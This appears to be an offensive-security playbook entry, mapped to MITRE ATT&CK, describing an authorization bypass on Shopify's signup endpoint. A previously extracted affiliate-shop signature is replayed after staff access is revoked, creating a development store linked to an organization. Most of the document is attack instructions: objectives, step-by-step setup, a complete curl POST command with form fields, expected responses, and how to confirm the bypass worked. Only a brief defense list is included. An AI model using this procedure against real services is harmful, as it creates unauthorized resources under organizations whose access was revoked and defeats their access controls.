---
id: proc-shopify-create-store-bypass-001
tags:
  - shopify
  - authorization-bypass
  - post-request
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-signup-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:29:57.385Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Create-Development-Store-with-Extracted-Signature

## Summary

This procedure submits a POST request to the Shopify signup endpoint using the extracted persistent signature, bypassing revocation to create a development store linked to the organization.

## Description

The endpoint https://app.shopify.com/services/signup/setup accepts the extra[affiliate_shop] signature without re-validating current permissions. Arbitrary fields like shop name, email, and address are filled, associating the store with the organization. This leads to unauthorized resource creation visible in the partners dashboard.

## Requirements

1. Extracted extra[affiliate_shop] signature
2. Tools to send POST requests (e.g., curl, Burp Suite)
3. Revoked staff context (no active session needed)

## Defense

Defensive measures and detection strategies:

- Validate signatures against current user permissions on backend
- Expire signatures upon access changes
- Rate-limit and log signup attempts with organization signatures

## Objectives

1. Bypass authorization using old signature
2. Create development store
3. Associate store with target organization

## Instructions

### Step 1: Prepare Request Parameters

**Context**: Gather required form data, including the signature.

Set shop_name, email, password, signup_types=affiliate_shop, signup_source=development+shop, extra[affiliate_shop]=[signature], and address fields.

### Step 2: Submit POST Request

**Context**: Send the request to the signup endpoint.

Execute [[commands/shopify-signup-post]] to verify:

```bash
curl -X POST https://app.shopify.com/services/signup/setup \
  -d "signup[shop_name]=testdevstore" \
  -d "signup[email]=test@example.com" \
  -d "signup[password]=password123" \
  -d "signup_types=affiliate_shop" \
  -d "signup_source=development+shop" \
  -d "extra[affiliate_shop]=extracted_signature_here" \
  -d "address[first_name]=Test" \
  -d "address[last_name]=User" \
  -d "address[address1]=123 Test St" \
  -d "address[city]=Test City" \
  -d "address[zip]=12345" \
  -d "address[country]=US"
```

> The command sends a form-encoded POST; expect a success redirect or JSON confirmation if authenticated via signature.

**Expected Output**: HTTP response indicating store creation (e.g., 302 redirect to setup completion).

### Step 3: Handle Response

**Context**: Confirm no auth errors.

Check for errors; success means bypass worked.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/shopify-signup-post]]

## Tools Used


## Tags

- shopify
- authorization-bypass
